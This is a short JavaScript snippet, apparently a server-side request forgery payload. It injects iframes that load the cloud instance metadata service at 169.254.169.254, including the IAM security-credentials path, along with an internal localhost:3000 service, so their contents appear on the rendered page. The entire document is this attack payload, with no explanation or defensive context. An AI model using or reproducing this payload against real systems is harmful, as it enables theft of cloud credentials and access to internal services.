var i = document.createElement('div');
createFrame = function(url)
{
  var f = document.createElement('iframe');
  f.src = url;
  f.width = 600;
  f.height = 300;
  i.appendChild(f);
  i.appendChild(document.createElement('hr'));
}

createFrame('https://169.254.169.254/latest/meta-data/');
createFrame('https://169.254.169.254/latest/meta-data/iam/security-credentials/');
createFrame('https://localhost:3000/');

document.body.appendChild(i);
